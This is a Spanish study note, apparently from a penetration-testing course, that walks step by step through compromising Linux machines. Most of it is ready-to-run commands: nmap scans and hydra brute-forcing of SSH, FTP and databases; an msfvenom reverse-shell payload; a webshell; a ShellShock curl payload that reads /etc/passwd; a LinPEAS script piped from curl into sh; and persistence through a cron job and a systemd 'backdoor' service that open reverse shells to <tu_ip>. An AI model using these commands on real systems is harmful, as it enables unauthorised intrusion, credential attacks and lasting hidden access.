

> [!info] Objetivo
> Guía concisa para explotar máquinas Linux desde el reconocimiento hasta la escalada.

---

## Fase 1: Reconocimiento

> [!tip] Descubrir hosts y servicios

```bash
# Descubrir hosts
nmap -sn <target>/24

# Escaneo completo
nmap -sC -sV -O -p- <target>

# Scripts de enumeración
nmap -sC -sV -sU -p- <target> # UDP
```

---

## Fase 2: Enumeración

> [!important] Encontrar vectores de ataque

### Servicios Web

```bash
# Directorios
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://<target>

# Fuzzing recursivo
feroxbuster -u http://<target> -r

# Parámetros
ffuf -u "http://<target>/page?FUZZ=test" -w params.txt
```

### SSH

```bash
# Banner grab
nmap -sV -p 22 <target>

# Fuerza bruta
hydra -l root -P passwords.txt ssh://<target>
```

### FTP

```bash
# Conexión anónima
nmap -sV -p 21 <target>
ftp anonymous@<target>

# Fuerza bruta
hydra -l admin -P passwords.txt ftp://<target>
```

### SMB

```bash
# Enumeración
smbclient -L //<target> -N
enum4linux -a //<target>
nmap -p 445 --script smb-enum-shares,smb-enum-users <target>
```

### MySQL/PostgreSQL

```bash
# Conexión
mysql -h <target> -u root -p
psql -h <target> -U postgres

# Fuerza bruta
hydra -l root -P passwords.txt mysql://<target>
hydra -l postgres -P passwords.txt postgres://<target>
```

---

## Fase 3: Explotación

> [!danger] Obtener acceso

### Reverse Shell

```bash
# Generar payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f elf -o shell

# Escuchar
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <tu_ip>; set LPORT 4444; run"
```

### Web Shell

```bash
# Subir webshell
upload shell.php /var/www/html/

# Conectar
curl http://<target>/shell.php?cmd=whoami
```

> [!tip] ESTABILIZAR LA SHELL (TTY)
> Tras cualquier reverse shell, mejorar a interactiva:
> `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg`
> Alternativas: `script -qc /bin/bash /dev/null`, `socat`. Ver [[Reverse Shells y Post-Explotación]].

### ShellShock (CVE-2014-6271) — BLOQUE 5

Explota el componente CGI de Apache: ejecución de código arbitrario vía **variables de entorno HTTP** inyectadas (`User-Agent`, `Referer`...).

```bash
# Paso 1: fingerprinting — Nikto revela /cgi-bin/status
nikto -h http://<target>

# Paso 2: verificación manual con cURL
curl -A '() { :;}; /bin/cat /etc/passwd' http://<target>/cgi-bin/status
# Si responde con /etc/passwd → confirmado

# Paso 3: reverse shell con Metasploit
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target>
set TARGETURI /cgi-bin/status
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST tun0
run
```

### Explotar Servicios

```bash
# Metasploit
search <servicio>
use exploit/<ruta>
set RHOSTS <target>
run

# Scripts NSE
nmap --script <script> -p <puerto> <target>
```

---

## Fase 4: Escalada de Privilegios

> [!warning] Conseguir root

### Diagnóstico

```bash
# Información del sistema
uname -a
cat /etc/os-release

# Usuario actual
id
whoami

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Sudo permissions
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Capabilities
getcap -r / 2>/dev/null
```

### Técnicas Comunes

> [!important] GTFOBins
> Ante cualquier binario permitido por `sudo -l` o con SUID: **[gtfobins.github.io](https://gtfobins.github.io)** es la referencia para comprobar si existe escape a shell privilegiada. Error típico: olvidar anteponer `sudo` al payload de escape — el binario de sudoers solo da privilegios si se invoca con `sudo`.

| Vector          | Herramienta                        |               |
| --------------- | ---------------------------------- | ------------- |
| SUID binaries   | [[Linux#Permisos y Propietarios    | find, chmod]] |
| Sudo abuse      | `sudo -l`                          |               |
| Cron jobs       | Editar scripts ejecutados por root |               |
| Kernel exploit  | SearchSploit                       |               |
| Capabilities    | getcap                             |               |
| PATH abuse      | Script en directorio no protegido  |               |
| NFS root squash | Montar sistema de archivos         |               |

### Herramientas

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

---

## Fase 5: Persistencia

> [!note] Mantener acceso

```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'" | crontab -

# SSH key
echo "<tu_public_key>" >> ~/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
```

---

#checklist
- [ ] Reconocimiento completado
- [ ] Servicios enumerados
- [ ] Vector de ataque identificado
- [ ] Acceso obtenido
- [ ] Escalada de privilegios completada
- [ ] Persistencia configurada
- [ ] Shell estabilizada (TTY) tras la reverse shell
- [ ] ShellShock (CVE-2014-6271) reconocido y explotable
- [ ] GTFOBins consultado ante cada sudo/SUID









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Linux, Linux, Netcat / Reverse Shells
- [[../09 - Pivoting y Movilidad Lateral/Pivoting y Movilidad Lateral.md|Pivoting y Movilidad Lateral]] — Desarrollo Web, Linux, Netcat / Reverse Shells
- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Linux, Linux, Netcat / Reverse Shells
- [[../../apuntes Andres/07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote.md|07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote]] — Desarrollo Web, Linux, Netcat / Reverse Shells
- [[../../apuntes Andres/08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco.md|08.07.2026 Path Traversal, LFI y Escalada - Máquina Banco]] — Desarrollo Web, Linux, Netcat / Reverse Shells

### 🌐 Cross-Dominio

- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, Linux, SQL
- [[../../../programacion/PHP/seguridad_php.md|seguridad_php]] — Programacion: Desarrollo Web, Redes, SQL

> #cli #escalada_privilegios #forense #java #linux #linux_ciber #metasploit #netcat #pivoting #redes #reverse_shell #sql #ssh_tool #web
